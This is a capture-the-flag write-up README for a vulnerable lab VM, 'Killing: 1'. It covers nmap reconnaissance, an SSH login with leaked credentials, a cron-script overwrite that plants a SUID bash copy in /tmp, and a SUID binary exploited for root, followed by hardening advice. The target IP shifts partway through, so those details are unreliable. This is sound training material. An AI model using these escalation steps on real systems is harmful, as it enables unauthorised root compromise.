# Killing: 1 — Boot-to-Root CTF Security Report & Walkthrough

A dark, terminal-inspired, single-page technical report and interactive walkthrough for the custom vulnerable Linux machine **"Killing: 1"**.

---

## 🎯 2. Kill-Chain Progression Matrix

| Attack Phase | Tactical Focus | System Access Level Obtained | Captured Tokens / Flags | Status |
| :--- | :--- | :--- | :--- | :--- |
| **Phase 01** | External Web Infrastructure Reconnaissance | Unauthenticated Network Actor | None | `COMPLETED` |
| **Phase 02** | Staging Directory Information Leak Capture | Directory Content Read Access | None | `COMPLETED` |
| **Phase 03** | SSH Perimeter Intrusion Verification | Local Shell Access (`user1`) | `flag{found_the_leaked_creds}` | `COMPLETED` |
| **Phase 04** | Cron Pipeline Script Misconfiguration Abuse | Lateral Account Shell Access (`user2`) | `flag{pivoted_via_cron}` | `COMPLETED` |
| **Phase 05** | High-Privilege SUID Binary Hijack | Absolute System Operator (`root`) | `flag{root_via_suid}` | `COMPLETED` |

---

## 🛠️ 3. Technical Walkthrough & Exploitation Lifecycle

### 🔍 3.1 Initial Service Probing & Attack Surface Mapping
An aggressive full-port SYN stealth scan was initiated against the host interface to profile exposed listener endpoints and retrieve daemon banner strings.

```bash
nmap -sV -p- 192.168.56.101
```

```ini
# Nmap 7.94 scan initiated: SYN Stealth Scan with Version Probing
Starting Nmap 7.94 ( https://nmap.org ) at 2026-10-22 10:14 UTC
Nmap scan report for 192.168.56.101
Host is up (0.00045s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
* **Analysis Deduction:** TCP Port 22 handles remote access requiring prior authentication. Consequently, the exposed Apache web engine running on TCP Port 80 serves as our initial vector for entry mapping.

### 🔑 3.2 Perimeter Intrusion & Verification of Token 01
Web application analysis exposed an unlinked staging deployment folder containing system configuration notes. These notes leaked active plaintext credentials assigned to the local account `user1`: `[Spring2026!]`.

**Command Sequence:**
```bash
# 1. Access the target host perimeter over SSH
ssh user1@10.0.2.15

# 2. Audit current directory context listings
ls -la
```

**Terminal Buffer Output:**
```html
user1@10.0.2.15's password: [Spring2026!]
Welcome to Lubuntu 24.04 LTS (GNU/Linux 6.8.0-31-generic x86_64)

total 28
drwxr-xr-x 4 user1 user1 4096 Oct 22 09:30 .
drwxr-xr-x 4 root  root  4096 Oct 22 08:45 ..
-rw-r--r-- 1 user1 user1  220 Oct 22 08:45 .bash_logout
-rw-r--r-- 1 user1 user1 3771 Oct 22 08:45 .bashrc
-rw-r--r-- 1 user1 user1  807 Oct 22 08:45 .profile
-r-------- 1 user1 user1   32 Oct 22 09:12 .sys_check_report
```

**Token Extraction:**
```bash
cat ~/.sys_check_report
```
```properties
flag{found_the_leaked_creds}
```

### 🔄 3.3 Lateral Movement Pipeline Exploitation (Pivoting to `user2`)
Local privilege auditing discovered a system-wide Cron job configuration running background processing operations at 60-second intervals under the context of `user2`. The task runs an automation script located at `/opt/scripts/cleanup.sh`. The file permissions on this target asset were misconfigured to allow global world-writable operations (`777`).

**Command Sequence:**
```bash
# 1. Enforce shell terminal processing baseline parameters
export TERM=xterm

# 2. Overwrite the cleanup routine to inject a SUID terminal duplicate payload
echo 'cp /bin/bash /tmp/newbash; chmod 4755 /tmp/newbash' > /opt/scripts/cleanup.sh

# 3. Wait 60 seconds for scheduling execution, then run verification
ls -la /tmp/newbash
```
* **Expected State:** The duplicate binary matches SUID flags: `-rwsr-xr-x 1 user2 user2 ... /tmp/newbash`.

**Privilege Execution Escalation:**
```bash
/tmp/newbash -p
whoami
```
```properties
user2
```

**Token Extraction:**
```bash
cat /home/user2/.cache_verify
```
```properties
flag{pivoted_via_cron}
```

### 👑 3.4 Vertical Privilege Takeover (Gaining Absolute `root` Shell)
Operating inside the execution profile of `user2`, an analysis scan for anomalous Set-Owner User ID (`SUID`) application items was deployed across the system interface.

**Command Sequence:**
```bash
find / -perm -4000 -type f 2>/dev/null
```
* **Discovery Flag:** The script isolates a proprietary, non-standard application container located at `/opt/vulntool` configured with high-privilege administrative execution capabilities.

**Execution Routine:**
```bash
/opt/vulntool
whoami
```
```properties
root
```

**Token Extraction:**
```bash
cat /root/.audit_final
```
```properties
flag{root_via_suid}
```
* **Final Analysis Deduction:** Complete system infrastructure takeover achieved successfully.

---

## 🔒 4. Vulnerability Remediation & System Hardening Blueprint

### 🚨 4.1 Vulnerability Case A: Exposed Staging Backups Under Webroot
* **Exploitation Context:** Plaintext system keys and credentials left within unlinked web deployment paths assume attackers will not run brute-force path profiling. 
* **Remediation Strategy:** Permanently remove sensitive code elements from the accessible web server directory layout. Enforce systemic folder listing restrictions within global configuration modules (e.g., `/etc/apache2/apache2.conf` or target `.htaccess` rulesets):
  ```apache
  # Prevent unauthenticated directory file mappings globally
  Options -Indexes
  ```

### 🚨 4.2 Vulnerability Case B: World-Writable Automation Tasks (Cron Script Abuse)
* **Exploitation Context:** Assigning open group write permissions (`777`) to operational scripts parsed by system-wide background agents enables arbitrary code execution injection.
* **Remediation Strategy:** Revoke global write access. Enforce standard restrictive configuration control mappings so that only authorized owners or administrative contexts can alter file operations:
  ```bash
  chown root:root /opt/scripts/cleanup.sh
  chmod 750 /opt/scripts/cleanup.sh
  ```

### 🚨 4.3 Vulnerability Case C: Unsafe SUID Binary Assignments
* **Exploitation Context:** Leaving custom binaries with active SUID bits allows non-root users to inherit system-level permissions. If these files can be manipulated into spawning sub-processes, full root compromise occurs.
* **Remediation Strategy:** Strip the SUID bit from custom utilities. Instead, grant explicit system capabilities (`setcap`) or implement highly restricted, parameters-validated authorization rules inside the system `sudoers` file structure:
  ```bash
  # Remove execution impersonation privileges completely
  chmod u-s /opt/vulntool
  ```

---

## 🗃️ 5. Technical Competencies Validated
* Highly Focused System and Network Enumeration Frameworks (`Nmap`)
* Web Infrastructure Attack Path Profiling
* Secure Shell (SSH) Access Interrogation Mappings
* Task Automation Hijacking Vectors (Cron Job Overwrite Operations)
* High-Privilege System Attribute Takeover (SUID Manipulation)
* Automation and Shell Script Engineering (`Bash`)

---

## 📁 GitHub Pages Deployment Guide

To deploy this project directly to **GitHub Pages**:
1. In GitHub, go to **Settings** > **Pages** and verify the source is set to `Deploy from a branch` on `main` / `/ (root)`.
2. The site will be available at `https://mohammedrifad123.github.io/killing-dark-access/`.

---

## ⚡ Vercel Deployment Guide

To host this site on Vercel under your account (`rifad2`):

### 1-Click Import (Recommended)
1. Open this direct import link:  
   👉 **[Deploy on Vercel](https://vercel.com/new/clone?repository-url=https%3A%2F%2Fgithub.com%2FMohammedRifad123%2Fkilling-dark-access)**
2. Select your Vercel account (`rifad2`).
3. Under **Project Name**, keep `killing-dark-access`.
4. Click **Deploy**. Vercel will build and assign an instant production URL with automatic HTTPS and edge CDN caching. Every future `git push origin main` will automatically redeploy!

